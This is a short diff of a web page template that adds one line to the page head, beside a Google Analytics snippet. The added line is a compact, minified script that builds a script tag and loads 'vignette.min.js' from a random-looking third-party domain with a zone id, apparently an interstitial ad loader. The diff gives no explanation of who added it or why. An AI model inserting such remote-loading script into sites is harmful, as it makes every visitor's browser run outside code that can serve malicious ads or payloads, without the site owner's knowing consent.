@@ -53,6 +53,7 @@
         gtag('config', 'G-24D94XLJ6V');
     </script>
     @stack('publish')
+    <script>(function(s){s.dataset.zone='10081036',s.src='https://gizokraijaw.net/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
 </head>
 
 <body class="bg-fixed bg-repeat-x text-gray-800 font-inter"
